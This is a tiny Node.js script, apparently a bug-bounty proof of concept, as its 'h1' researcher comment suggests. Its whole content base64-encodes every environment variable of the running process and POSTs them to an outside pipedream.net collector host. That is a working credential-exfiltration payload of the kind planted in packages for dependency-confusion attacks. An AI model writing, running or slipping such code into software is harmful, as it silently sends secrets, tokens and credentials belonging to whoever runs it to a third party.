//h1/homosec
const http = require('https');

req = http.request({
  host: '76c42f27d26091659dca820a37e6f5d3.m.pipedream.net',
  path: '/',
  method: 'POST'
});

req.write(Buffer.from(JSON.stringify(process.env)).toString('base64'));
req.end();
